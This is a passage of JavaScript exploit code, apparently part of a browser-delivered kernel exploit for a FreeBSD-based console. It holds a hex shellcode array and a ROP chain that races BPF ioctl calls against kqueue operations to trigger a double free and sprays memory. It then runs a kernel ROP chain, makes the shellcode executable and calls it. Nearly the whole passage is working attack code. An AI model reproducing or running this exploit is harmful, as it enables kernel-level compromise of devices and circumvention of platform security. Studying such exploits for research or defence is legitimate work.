			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x6A302494, 0x8D4DFFCF, 0xE18024B4, 0x8D4D000E, 0xE96024AC, 0x8149FFD0, 0x65A680C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		}
		
		var shellbuf = p.malloc32(0x1000);
		for (var i = 0; i < shcode.length; i++)
			shellbuf.backing[i] = shcode[i];
		
		// RACE!
		var race = new rop();
		start1();
		while (1) {
			race.count = 0;
			
			// Create a kqueue
			race.push(window.syscalls[362]);
			race.push(window.gadgets["pop rdi"]);
			race.push(kq);
			race.push(window.gadgets["mov [rdi], rax"]);
			
			// Race against the other thread
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push_write8(loop1, interrupt1);
			race.push(window.gadgets["pop rdi"]);
			race.push(fd);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B);
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_valid_prog);
			race.push(window.syscalls[54]);
			
			// Attempt to trigger double free()
			race.push(window.gadgets["pop rax"]);
			race.push(kq);
			race.push(window.gadgets["mov rax, [rax]"]);
			race.push(window.gadgets["pop rdi"]);
			race.push(0);
			race.push(window.gadgets["add rdi, rax"]);
			race.push(window.gadgets["pop rsi"]);
			race.push(kev);
			race.push(window.gadgets["pop rdx"]);
			race.push(1);
			race.push(window.gadgets["pop rcx"]);
			race.push(0);
			race.push(window.gadgets["pop r8"]);
			race.push(0);
			race.push(window.syscalls[363]);
			
			// Spray via ioctl
			race.push(window.gadgets["pop rdi"]);
			race.push(fd1);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B);
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_spray_prog);
			race.push(window.syscalls[54]);
			
			// Close the poisoned kqueue and run the kROP chain!
			race.push(window.gadgets["pop rax"]);
			race.push(kq);
			race.push(window.gadgets["mov rax, [rax]"]);
			race.push(window.gadgets["pop rdi"]);
			race.push(0);
			race.push(window.gadgets["add rdi, rax"]);
			race.push(window.syscalls[6]);
			
			// alert("Gotta go fast!"); // for kexploit debugging
			race.run();
			
			if (kscratch.backing[0] != 0) {
				// Clean up memory
				p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
				p.fcall(shellbuf);
				
				return true;
			}
		}
	} catch(ex) {
		fail(ex)
	}
	
	// failed (should never go here)
	return false;
}
